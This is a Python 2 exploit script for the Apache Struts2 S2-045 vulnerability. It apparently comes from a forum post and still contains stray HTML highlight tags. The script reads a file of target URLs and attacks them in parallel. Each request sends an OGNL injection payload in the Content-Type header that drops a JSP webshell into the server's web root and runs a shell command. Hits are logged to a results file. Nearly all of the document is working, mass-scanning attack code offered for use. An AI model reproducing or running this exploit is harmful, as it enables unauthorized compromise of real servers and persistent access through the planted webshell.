#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ------------------------------------------------------------------------------
# Name:        <strong><font color="#FF0000">struts</font></strong>2 045 exploit tools
# Author:      pirogue
# Created:     2017年3月2日12:48:09
# Site:        [url=http://www.pirogue.org]http://www.pirogue.org[/url]
# useage:      python pi_<strong><font color="#FF0000">struts</font></strong>2-045.py xxx.txt 5
# ------------------------------------------------------------------------------


import urllib2
import sys
import time
from multiprocessing.dummy import Pool as ThreadPool
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

reload(sys)
sys.setdefaultencoding = 'utf-8'


class Pi_Struts2_045(object):
    """init variables"""
    def __init__(self, sthreads=5):
        # self.surl = surl
        self.stime = time.strftime("%Y-%m-%d%H%M%S", time.localtime())
        self.sthreads = sthreads
        self.datagen, self.header = multipart_encode(
            {"image1": open("tmp.txt", "rb")})

        self.header["User-agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 MicroMessenger/6.0.1 NetType/WIFI"

        self.webshell = 'mm<%new java.io.FileOutputStream(request.getParameter(\\\"f\\\")).write(request.getParameter(\\\"c\\\").getBytes());%>'

        # self.test = open('caidao.jsp', 'rb').read()
        self.header["Content-Type"] = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ccccc='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#shell='" + self.webshell + "').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'/ccccc.jsp').append(#shell)).close()).(#cmd='echo \\\"write file to '+#path+'/ccccc.jsp\\\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.<strong><font color=\"#FF0000\">struts</font></strong>2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    def spost_exp(self, ck_url):
        """post payload"""
        # print self.header
        try:
            register_openers()
            request_s2_045 = urllib2.Request(ck_url, self.datagen, self.header)
            response_s2_045 = urllib2.urlopen(request_s2_045, timeout=5)
            res = response_s2_045.read()
            self.ensure(res, ck_url)
            # print res
        except:
            print "error--->" + ck_url


    def ensure(self, res, shost):
        """output <strong><font color="#FF0000">struts</font></strong>2 045 res"""
        # stime = time.strftime("%Y-%m-%d%H%M%S", time.localtime())
        if "ccccc" in res:
            with open(self.stime+'result.txt', 'a') as f_s:
                f_s.write(res + shost)
                print shost

    def check_url(self, url_txt):
        'check url list'
        with open(url_txt, 'rb') as c_f:
            # print type(c_f)
            pool = ThreadPool(self.sthreads)
            pool.map(self.spost_exp, c_f)
            pool.close()
            pool.join()
            # for url in c_f:
            #     self.spost_exp(stime ,url)
    # def read_file(self):
    #     """read webshell content to str"""
    #     file_object = open('caidao.jsp', 'rb').read()
    #     print file_object


def main():
    """useage: python pi_<strong><font color="#FF0000">struts</font></strong>2-045.py xxx.txt 5"""
    if len(sys.argv) == 2:
        exploit = Pi_Struts2_045()
        exploit.check_url(str(sys.argv[1]))
    elif len(sys.argv) == 3 and type(int(sys.argv[2])) is int:
        exploit = Pi_Struts2_045(int(sys.argv[2]))
        exploit.check_url(str(sys.argv[1]))


if __name__ == '__main__':
    main()